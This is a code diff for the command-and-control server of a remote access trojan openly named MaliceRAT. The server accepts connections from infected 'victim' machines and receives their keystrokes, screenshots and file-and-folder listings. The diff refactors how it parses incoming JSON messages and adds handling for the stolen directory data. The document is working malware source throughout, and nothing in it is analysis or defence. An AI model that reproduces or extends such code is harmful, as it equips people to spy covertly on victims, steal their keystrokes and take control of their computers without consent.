@@ -15,16 +15,17 @@ namespace MaliceRAT.RatServer
     public class Server
     {
         #region Features
-        public ScreenViewer screenViewer = new ScreenViewer();
+        public ScreenViewer screenViewer;
         public Heartbeat heartbeatManager;
+        public Features.SystemInformation systemInformation;
         #endregion
 
         #region Events
-        public event Action<string> MessageReceived;
-        public event Action<Victim> InfoReceived;
+        public event Action<Victim, dynamic> MessageReceived;
         public event Action<Victim> ClientConnected;
         public event Action<Victim> ClientDisconnected;
         public event Action<Victim, string> KeystrokeReceived;
+        public event Action<Victim, string> FilesAndFoldersReceived;
         #endregion
 
         #region Variables
@@ -47,6 +48,8 @@ namespace MaliceRAT.RatServer
         public Server()
         {
             AllocConsole();
+
+            #region Config
             string configPath = Path.Combine(Application.StartupPath, "config.json");
             if (File.Exists(configPath))
             {
@@ -65,11 +68,17 @@ namespace MaliceRAT.RatServer
                 Console.WriteLine("config.json not found.");
                 Application.Exit();
             }
+            #endregion
 
+            #region Features
+            systemInformation = new Features.SystemInformation(this);
+            screenViewer = new ScreenViewer(this);
             heartbeatManager = new Heartbeat(HeartbeatInterval, this);
+            #endregion
         }
         #endregion
 
+        #region Methods
         public void StartServer()
         {
             IPAddress ipAddress = IPAddress.Parse(IP);
@@ -84,110 +93,88 @@ namespace MaliceRAT.RatServer
             while (true)
             {
                 TcpClient tcpClient = await server.AcceptTcpClientAsync();
-                Victim client = new Victim(tcpClient, victims.Count);
-                OnClientConnected(client);
-                var clientTask = HandleClient(client);
-                clientTasks[client.Id] = clientTask;
-                await clientTask.ContinueWith(t => clientTasks.Remove(client.Id));
+                Victim victim = new Victim(tcpClient, victims.Count);
+                OnClientConnected(victim);
+                var clientTask = HandleClient(victim);
+                clientTasks[victim.Id] = clientTask;
+                await clientTask.ContinueWith(t => clientTasks.Remove(victim.Id));
             }
         }
 
-        private async Task HandleClient(Victim client)
+        private async Task HandleClient(Victim victim)
         {
-            using (NetworkStream stream = client.TcpClient.GetStream())
+            using (NetworkStream stream = victim.TcpClient.GetStream())
             {
                 byte[] buffer = new byte[BufferSize];
+                StringBuilder messageBuilder = new StringBuilder();
                 int bytesRead;
 
-                heartbeatManager.StartHeartbeat(stream, client);
+                heartbeatManager.StartHeartbeat(stream, victim);
 
                 while ((bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length)) != 0)
                 {
                     string receivedMessage = Encoding.UTF8.GetString(buffer, 0, bytesRead);
-                    Console.WriteLine("Received message: " + receivedMessage);
-                    try
+                    messageBuilder.Append(receivedMessage);
+
+                    if (receivedMessage.EndsWith("}"))  // Check if the JSON message ends with }
                     {
-                        dynamic jsonMessage = serializer.Deserialize<dynamic>(receivedMessage);
+                        string completeMessage = messageBuilder.ToString();
+                        messageBuilder.Clear();  // Clear the builder for the next message
 
-                        if (jsonMessage["type"] == "message")
-                        {
-                            OnMessageReceived(jsonMessage["text"].ToString());
-                        }
-                        else if (jsonMessage["type"] == "info")
-                        {
-                            string OS = jsonMessage["os"].ToString();
-                            string PC = jsonMessage["pc"].ToString();
-                            string User = jsonMessage["user"].ToString();
+                        Console.WriteLine("Received message: " + completeMessage);
 
-                            IPEndPoint clientEndPoint = client.TcpClient.Client.RemoteEndPoint as IPEndPoint;
-                            client.IP = clientEndPoint.Address.ToString();
-
-                            client.OS = OS;
-                            client.PC = PC;
-                            client.User = User;
-
-                            InfoReceived?.Invoke(client);
-                        }
-                        else if (jsonMessage["type"] == "heartbeat")
+                        try
                         {
-                            heartbeatManager.ReceiveHeartbeat();
+                            dynamic jsonMessage = serializer.Deserialize<dynamic>(completeMessage);
+                            MessageReceived?.Invoke(victim, jsonMessage);
+                            ProcessJsonMessage(victim, jsonMessage);
                         }
-                        else if (jsonMessage["type"] == "screenshot_chunk")
+                        catch (InvalidOperationException ex)
                         {
-                            screenViewer.HandleScreenshotChunk(jsonMessage["data"].ToString(), jsonMessage["final"]);
+                            Console.WriteLine($"Invalid JSON received: {ex.Message}");
+                            Console.WriteLine($"Received message content: {completeMessage}");
                         }
-                        else if (jsonMessage["type"] == "stop_screenshots")
-                        {
-                            Console.WriteLine("Client has stopped sending screenshots: " + client.IP);
-                        }
-                        else if (jsonMessage["type"] == "keystroke")
-                        {
-                            string keystroke = jsonMessage["key"].ToString();
-                            Console.WriteLine($"Keystroke received from {client.IP}: {keystroke}");
-                            KeystrokeReceived?.Invoke(client, keystroke);
-                        }
-                    }
-                    catch (InvalidOperationException)
-                    {
-                        Console.WriteLine("Invalid JSON received.");
-                        continue;
                     }
                 }
                 
                 heartbeatManager.StopHeartbeat();
-                OnClientDisconnected(client);
+                OnClientDisconnected(victim);
             }
         }
 
-        protected virtual void OnMessageReceived(string message)
+        private void ProcessJsonMessage(Victim victim, dynamic jsonMessage)
         {
-            MessageReceived?.Invoke(message);
+            switch (jsonMessage["type"].ToString())
+            {
+                case "keystroke":
+                    string keystroke = jsonMessage["key"].ToString();
+                    KeystrokeReceived?.Invoke(victim, keystroke);
+                    break;
+                case "files_and_folders":
+                    string filesAndFoldersJson = jsonMessage["filesAndFolders"];
+                    FilesAndFoldersReceived?.Invoke(victim, filesAndFoldersJson);
+                    break;
+            }
         }
 
-        protected virtual void OnClientConnected(Victim client)
+        protected virtual void OnClientConnected(Victim victim)
         {
-            victims.Add(client);
-            Console.WriteLine("Client connected: " + client.IP);
-            ClientConnected?.Invoke(client);
+            victims.Add(victim);
+            Console.WriteLine("Victim connected: " + victim.IP);
+            ClientConnected?.Invoke(victim);
         }
 
-        public void OnClientDisconnected(Victim client)
+        public void OnClientDisconnected(Victim victim)
         {
-            victims.Remove(client);
-            Console.WriteLine("Client disconnected: " + client.IP);
-            ClientDisconnected?.Invoke(client);
+            victims.Remove(victim);
+            Console.WriteLine("Victim disconnected: " + victim.IP);
+            ClientDisconnected?.Invoke(victim);
         }
 
         public Victim GetVictimById(int id)
         {
             return victims.Find(v => v.Id == id);
         }
-
-        public void SendMessageTo(Victim client, object message)
-        {
-            string jsonMessage = serializer.Serialize(message);
-            byte[] data = Encoding.UTF8.GetBytes(jsonMessage);
-            client.TcpClient.GetStream().Write(data, 0, data.Length);
-        }
+        #endregion
     }
 }
